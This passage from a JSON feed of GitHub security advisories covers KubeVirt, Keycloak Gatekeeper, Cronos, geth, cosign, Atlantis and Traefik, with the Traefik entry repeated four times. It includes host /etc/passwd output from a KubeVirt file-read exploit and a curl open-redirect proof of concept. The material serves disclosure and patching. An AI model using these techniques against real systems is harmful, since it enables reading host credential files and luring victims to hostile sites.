/dev/vdc\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n[...]\n</code></pre>\n<p><strong>Further Analysis</strong>\nIn order to mitigate this vulnerability, Sanitize imagePath in pkg/container-disk/container-disk.go following ISE best practices described and Add checks in pkg/virt-api/webhooks/validating-webhook/admitters/vmi-create-admitter.go</p>\n<p><strong>Timeline</strong>\nDate reported: 05/10/2022\nDate fixed: N/A\nDate disclosed: 08/08/2022</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm\">https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cvx8-ppmc-78hm\">https://github.com/advisories/GHSA-cvx8-ppmc-78hm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cvx8-ppmc-78hm",
            "title": "[kubevirt.io/kubevirt] KubeVirt arbitrary host file read from the VM",
            "date_modified": "2022-08-19T17:10:16.000Z",
            "date_published": "2022-08-18T19:02:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cvx8-ppmc-78hm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in all versions of the deprecated package Keycloak Gatekeeper, where on using lower case HTTP headers (via cURL) we can bypass our Gatekeeper. Lower case headers are also accepted by some webservers (e.g. Jetty). This means there is no protection when we put a Gatekeeper in front of a Jetty server and use lowercase headers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-14359\">https://nvd.nist.gov/vuln/detail/CVE-2020-14359</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1868591\">https://bugzilla.redhat.com/show_bug.cgi?id=1868591</a></li>\n<li><a href=\"https://issues.jboss.org/browse/KEYCLOAK-14090\">https://issues.jboss.org/browse/KEYCLOAK-14090</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/issues/12934\">https://github.com/keycloak/keycloak/issues/12934</a></li>\n<li><a href=\"https://web.archive.org/web/20190613000352/github.com/keycloak/keycloak-gatekeeper\">https://web.archive.org/web/20190613000352/github.com/keycloak/keycloak-gatekeeper</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jh6m-3pqw-242h\">https://github.com/advisories/GHSA-jh6m-3pqw-242h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jh6m-3pqw-242h",
            "title": "[github.com/keycloak/keycloak-gatekeeper] Keycloak Gatekeeper vulnerable to bypass on using lower case HTTP headers",
            "date_modified": "2022-08-12T20:52:15.000Z",
            "date_published": "2022-02-09T00:56:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jh6m-3pqw-242h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Cronos nodes running versions before v0.7.0, the contract selfdestruct invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in Ethermint, all contracts that used the identical bytecode (i.e shared the same CodeHash) will also stop working once one contract invokes selfdestruct, even though the other contracts did not invoke the selfdestruct OPCODE. Thanks to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. This problem has been patched in Cronos v0.8.0. The patch has state machine-breaking changes and the required coordinated network upgrade was done on the block height 3982500 on the Cronos mainnet beta network. If a contract is subject to DoS due to this issue, the user can redeploy the same contract, i.e with identical bytecode, so that the original contract's code is recovered.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/crypto-org-chain/cronos/security/advisories/GHSA-gwj5-wp6r-5q9f\">https://github.com/crypto-org-chain/cronos/security/advisories/GHSA-gwj5-wp6r-5q9f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35936\">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gwj5-wp6r-5q9f\">https://github.com/advisories/GHSA-gwj5-wp6r-5q9f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gwj5-wp6r-5q9f",
            "title": "[github.com/crypto-org-chain/cronos] Cronos vulnerable to DoS through unintended Contract Selfdestruct",
            "date_modified": "2022-08-11T18:08:58.000Z",
            "date_published": "2022-08-11T18:08:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gwj5-wp6r-5q9f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Go Ethereum (aka geth) through 1.10.21 allows attackers to increase rewards by mining blocks in certain situations, and using a manipulation of time-difference values to achieve replacement of main-chain blocks, aka Riskless Uncle Making (RUM), as exploited in the wild in 2020 through 2022.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-37450\">https://nvd.nist.gov/vuln/detail/CVE-2022-37450</a></li>\n<li><a href=\"https://github.com/ethereum/go-ethereum/blob/671094279e8d27f4b4c3c94bf8b636c26b473976/core/forkchoice.go#L91-L94\">https://github.com/ethereum/go-ethereum/blob/671094279e8d27f4b4c3c94bf8b636c26b473976/core/forkchoice.go#L91-L94</a></li>\n<li><a href=\"https://medium.com/@aviv.yaish/uncle-maker-time-stamping-out-the-competition-in-ethereum-d27c1cb62fef\">https://medium.com/@aviv.yaish/uncle-maker-time-stamping-out-the-competition-in-ethereum-d27c1cb62fef</a></li>\n<li><a href=\"https://news.ycombinator.com/item?id=32354896\">https://news.ycombinator.com/item?id=32354896</a></li>\n<li><a href=\"http://dx.doi.org/10.13140/RG.2.2.27813.99043\">http://dx.doi.org/10.13140/RG.2.2.27813.99043</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rqmg-hrg4-fm69\">https://github.com/advisories/GHSA-rqmg-hrg4-fm69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rqmg-hrg4-fm69",
            "title": "[github.com/ethereum/go-ethereum] Go Ethereum allows attackers to use manipulation of time-difference values to achieve replacement of main-chain blocks",
            "date_modified": "2022-08-15T20:02:23.000Z",
            "date_published": "2022-08-06T00:00:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rqmg-hrg4-fm69"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>cosign verify-attestation</code> used with the <code>--type</code> flag will report a false positive verification when:</p>\n<ul>\n<li>There is at least one attestation with a valid signature</li>\n<li>There are NO attestations of the type being verified (--type defaults to \"custom\")</li>\n</ul>\n<p>This can happen when signing with a standard keypair and with \"keyless\" signing with Fulcio. Users should upgrade to cosign version 1.10.1 or greater for a patch. Currently the only workaround is to upgrade.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sigstore/cosign/security/advisories/GHSA-vjxv-45g9-9296\">https://github.com/sigstore/cosign/security/advisories/GHSA-vjxv-45g9-9296</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35929\">https://nvd.nist.gov/vuln/detail/CVE-2022-35929</a></li>\n<li><a href=\"https://github.com/sigstore/cosign/commit/c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94\">https://github.com/sigstore/cosign/commit/c5fda01a8ff33ca981f45a9f13e7fb6bd2080b94</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vjxv-45g9-9296\">https://github.com/advisories/GHSA-vjxv-45g9-9296</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vjxv-45g9-9296",
            "title": "[github.com/sigstore/cosign] cosign's `cosign verify-attestaton  --type` can report a false positive if any attestation exists",
            "date_modified": "2022-08-10T18:40:40.000Z",
            "date_published": "2022-08-10T18:40:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vjxv-45g9-9296"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PolicyController will report a false positive, resulting in an admission when it should not be admitted when:</p>\n<ul>\n<li>There is at least one attestation with a valid signature</li>\n<li>There are NO attestations of the type being verified (--type defaults to \"custom\")</li>\n</ul>\n<p>Users should upgrade to cosign version 0.2.1 or greater for a patch. There are no known workarounds at this time.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sigstore/policy-controller/security/advisories/GHSA-739f-hw6h-7wq8\">https://github.com/sigstore/policy-controller/security/advisories/GHSA-739f-hw6h-7wq8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35930\">https://nvd.nist.gov/vuln/detail/CVE-2022-35930</a></li>\n<li><a href=\"https://github.com/sigstore/policy-controller/commit/e852af36fb7d42678b21d7e97503c25bd1fd05c8\">https://github.com/sigstore/policy-controller/commit/e852af36fb7d42678b21d7e97503c25bd1fd05c8</a></li>\n<li><a href=\"https://github.com/sigstore/policy-controller/releases/tag/v0.2.1\">https://github.com/sigstore/policy-controller/releases/tag/v0.2.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-739f-hw6h-7wq8\">https://github.com/advisories/GHSA-739f-hw6h-7wq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-739f-hw6h-7wq8",
            "title": "[github.com/sigstore/policy-controller] PolicyController before 0.2.1 may bypass attestation verification",
            "date_modified": "2022-08-10T18:38:18.000Z",
            "date_published": "2022-08-10T18:38:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-739f-hw6h-7wq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>graphql-go (aka GraphQL for Go) through 0.8.0 has infinite recursion in the type definition parser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-37315\">https://nvd.nist.gov/vuln/detail/CVE-2022-37315</a></li>\n<li><a href=\"https://github.com/graphql-go/graphql/issues/637\">https://github.com/graphql-go/graphql/issues/637</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h3qm-jrrf-cgj3\">https://github.com/advisories/GHSA-h3qm-jrrf-cgj3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h3qm-jrrf-cgj3",
            "title": "[github.com/graphql-go/graphql] graphql-go through 0.8.0 has infinite recursion in the type definition parser",
            "date_modified": "2022-08-10T15:43:19.000Z",
            "date_published": "2022-08-02T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h3qm-jrrf-cgj3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The package github.com/runatlantis/atlantis/server/controllers/events before 0.19.7 are vulnerable to Timing Attack in the webhook event validator code, which does not use a constant-time comparison function to validate the webhook secret. It can allow an attacker to recover this secret as an attacker and then forge webhook events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24912\">https://nvd.nist.gov/vuln/detail/CVE-2022-24912</a></li>\n<li><a href=\"https://github.com/runatlantis/atlantis/issues/2391\">https://github.com/runatlantis/atlantis/issues/2391</a></li>\n<li><a href=\"https://github.com/runatlantis/atlantis/commit/48870911974adddaa4c99c8089e79b7d787fa820\">https://github.com/runatlantis/atlantis/commit/48870911974adddaa4c99c8089e79b7d787fa820</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUNATLANTISATLANTISSERVERCONTROLLERSEVENTS-2950851\">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUNATLANTISATLANTISSERVERCONTROLLERSEVENTS-2950851</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jxqv-jcvh-7gr4\">https://github.com/advisories/GHSA-jxqv-jcvh-7gr4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jxqv-jcvh-7gr4",
            "title": "[github.com/runatlantis/atlantis/server/controllers/events] Atlantis Events prior to 0.19.7 vulnerable to Timing Attack",
            "date_modified": "2022-08-09T02:25:40.000Z",
            "date_published": "2022-07-30T00:00:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jxqv-jcvh-7gr4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>\n<h2 id=\"details\">Details</h2>\n<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>\n<p>e.g.</p>\n<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n&lt;a href=\"https://example.org/dashboard/\"&gt;Found&lt;/a&gt;.`\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>\n<ul>\n<li><a href=\"https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>\n<li><a href=\"https://docs.traefik.io/v1.7/basics/#custom-headers\">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/containous/traefik/issues\">Traefik</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15129\">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>\n<li><a href=\"https://github.com/containous/traefik/pull/7109\">https://github.com/containous/traefik/pull/7109</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254\">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2\">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v1.7.26\">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.2.8\">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.3.0-rc3\">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>\n<li><a href=\"https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09\">https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp",
            "title": "[github.com/containous/traefik/v2/pkg/api] Traefik vulnerable to Open Redirect via handling of X-Forwarded-Prefix header",
            "date_modified": "2022-08-04T20:56:23.000Z",
            "date_published": "2022-02-11T23:19:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>\n<h2 id=\"details\">Details</h2>\n<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>\n<p>e.g.</p>\n<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n&lt;a href=\"https://example.org/dashboard/\"&gt;Found&lt;/a&gt;.`\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>\n<ul>\n<li><a href=\"https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>\n<li><a href=\"https://docs.traefik.io/v1.7/basics/#custom-headers\">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/containous/traefik/issues\">Traefik</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15129\">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>\n<li><a href=\"https://github.com/containous/traefik/pull/7109\">https://github.com/containous/traefik/pull/7109</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254\">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2\">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v1.7.26\">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.2.8\">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.3.0-rc3\">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>\n<li><a href=\"https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09\">https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp",
            "title": "[github.com/containous/traefik/v2/pkg/api] Traefik vulnerable to Open Redirect via handling of X-Forwarded-Prefix header",
            "date_modified": "2022-08-04T20:56:23.000Z",
            "date_published": "2022-02-11T23:19:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>\n<h2 id=\"details\">Details</h2>\n<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>\n<p>e.g.</p>\n<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n&lt;a href=\"https://example.org/dashboard/\"&gt;Found&lt;/a&gt;.`\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>\n<ul>\n<li><a href=\"https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>\n<li><a href=\"https://docs.traefik.io/v1.7/basics/#custom-headers\">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/containous/traefik/issues\">Traefik</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15129\">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>\n<li><a href=\"https://github.com/containous/traefik/pull/7109\">https://github.com/containous/traefik/pull/7109</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254\">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2\">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v1.7.26\">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.2.8\">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.3.0-rc3\">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>\n<li><a href=\"https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09\">https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp",
            "title": "[github.com/containous/traefik/api] Traefik vulnerable to Open Redirect via handling of X-Forwarded-Prefix header",
            "date_modified": "2022-08-04T20:56:23.000Z",
            "date_published": "2022-02-11T23:19:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>\n<h2 id=\"details\">Details</h2>\n<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>\n<p>e.g.</p>\n<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n&lt;a href=\"https://example.org/dashboard/\"&gt;Found&lt;/a&gt;.`\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>\n<ul>\n<li><a href=\"https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>\n<li><a href=\"https://docs.traefik.io/v1.7/basics/#custom-headers\">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/containous/traefik/issues\">Traefik</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15129\">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>\n<li><a href=\"https://github.com/containous/traefik/pull/7109\">https://github.com/containous/traefik/pull/7109</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254\">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2\">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v1.7.26\">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.2.8\">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.3.0-rc3\">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>\n<li><a href=\"https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09\">https://github.com/traefik/traefik/commit/e2c5f3712f68993de8ed3cb30da9ec0aa11acb09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp",
            "title": "[github.com/traefik/traefik/v2/pkg/api] Traefik vulnerable to Open Redirect via handling of X-Forwarded-Prefix header",
            "date_modified": "2022-08-04T20:56:23.000Z",
            "date_published": "2022-02-11T23:19:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>\n<h2 id=\"details\">Details</h2>\n<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>\n<p>e.g.</p>\n<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n&lt;a href=\"https://example.org/dashboard/\"&gt;Found&lt;/a&gt;.`\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>\n<ul>\n<li><a href=\"https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>\n<li><a href=\"https://docs.traefik.io/v1.7/basics/#custom-headers\">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/containous/traefik/issues\">Traefik</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15129\">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>\n<li><a href=\"https://github.com/containous/traefik/pull/7109\">https://github.com/containous/traefik/pull/7109</a></li>\n<li><a 